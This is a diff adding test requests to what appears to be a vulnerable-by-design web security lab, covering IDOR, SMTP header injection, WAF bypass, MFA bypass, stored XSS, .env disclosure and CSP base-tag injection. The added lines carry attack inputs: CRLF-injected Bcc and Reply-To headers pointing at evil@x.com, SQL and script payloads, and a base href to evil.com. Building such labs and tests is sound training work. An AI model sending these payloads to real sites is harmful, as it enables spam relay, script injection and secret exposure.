@@ -211,6 +211,25 @@ await t("misconfig-3 verbose", "/lab/misconfig-3?id=abc");
 // ---------- WebSockets (new) ----------
 await t("ws-3 noauth", "/lab/ws-3/admin");
 await t("ws-4 owner", "/lab/ws-4/action", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"to":"victim","amount":100,"from":"carlos"}' });
+// ---------- IDOR ----------
+await t("idor-1 invoice", "/lab/idor-1/invoice?id=1004");
+await t("idor-2 profile", "/lab/idor-2/profile?user_id=0");
+// ---------- SMTP header injection ----------
+await t("smtp-1 header", "/lab/smtp-1/send", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=foo%40x.com%0d%0aBcc%3A%20evil%40x.com&message=hi" });
+await t("smtp-2 subject", "/lab/smtp-2/send", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "name=bob%0d%0aReply-To%3A%20evil%40x.com&feedback=hi" });
+// ---------- WAF bypass ----------
+await t("waf-1 bypass", "/lab/waf-1/search?q=union/**/select");
+await t("waf-2 alt", "/lab/waf-2/comment?q=<svg onload=alert(1)>");
+// ---------- MFA bypass ----------
+await t("mfa-1 skip", "/lab/mfa-1/dashboard");
+await t("mfa-2 otp", "/lab/mfa-2/verify", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "code=123456" });
+// ---------- Stored XSS (comments) ----------
+await t("xss-8 stored", "/lab/xss-8/post", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "author=a&comment=<script>alert(1)</script>" });
+// ---------- Info disclosure ----------
+await t("info-3 env", "/lab/info-3/.env");
+// ---------- SRI / CSP ----------
+await t("sri-2 jsonp", "/lab/sri-2?callback=alert(1)");
+await t("csp-3 base", "/lab/csp-3?q=<base href=https://evil.com>");
 // ---------- Progress API ----------
 {
   const mk = await worker.fetch(new Request(base + "/api/mark-many", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ids: ["jwt-1", "oauth-1"] }) }), {});
